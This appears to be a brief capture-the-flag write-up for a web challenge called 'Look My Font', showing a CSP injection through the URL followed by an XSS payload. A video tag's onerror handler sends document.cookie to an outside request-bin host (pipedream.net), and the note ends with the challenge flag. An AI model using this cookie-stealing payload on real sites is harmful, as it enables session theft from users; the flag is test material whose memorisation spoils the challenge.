# Look My Font

Exploit by adding in the url a CSP rule:

'''
; script-src-attr 'unsafe-inline'
'''

Then in the hidden form:
'''html
<video src="non-existent-video.mp4" onerror="alert('Error loading video!')"></video>

<video src="non-existent-video.mp4" onerror="window.location.href='https://envaxh1ky3cse.x.pipedream.net/?' + document.cookie"></video>
'''

## Flag
flag{CSP_1nject10n_4r3_34sy!!!}